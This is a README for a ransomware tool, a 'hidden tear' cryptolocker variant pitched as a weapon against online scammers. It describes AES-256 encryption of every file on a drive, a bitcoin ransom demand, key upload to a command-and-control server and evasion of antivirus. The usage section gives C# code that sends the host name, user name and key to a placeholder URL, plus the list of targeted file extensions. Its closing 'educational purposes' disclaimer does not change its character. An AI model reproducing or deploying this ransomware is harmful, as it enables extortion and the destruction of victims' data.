         _     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_| 
                                                             -brought to you by:
                                                             -Dehvon C - Independent Security Researcher
                                                             -burp Squad hax0r gang
                                                     
This is a ransomware file crypter (cryptolocker) to test on spammers trying to steal money from users on KSL. 

**Features**
* Uses AES 256 encryption algorithm to encrypt all files on hard drive
* once photo of "credit card" information is opened by scammer, their hard drive will begin encrypting largest, most recently    opened files first & prompt victim for bitcoin payment to get files back 
* Sends encryption key to Command & Control server, for later recovery.
* Encrypted files can only be decrypted using decrypter program with encryption key only I have.
* Creates a text file in Desktop giving message to scammer, explaining that they are known scammers and I am fighting back.
* Small file size (12 KB)
* Doesn't get detected on any antivirus programs as of (08/15/2015) 

**Demonstration Video**

https://www.youtube.com/watch?v=Qa4GnsjQGvQ

**Usage**

* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)

  `string targetURL = "http://www.domain.com/hidden-tear/write.php?info=";`

* The script should writes the GET parameter to a text file. Sending process running in `SendPassword()` function

  ```
  string info = computerName + "-" + userName + " " + password;
  var fullUrl = targetURL + info;
  var conent = new System.Net.WebClient().DownloadString(fullUrl);
  
  ```
* Target file extensions can be change. Default list:

```
var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
```
**Legal Warning** 

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear.
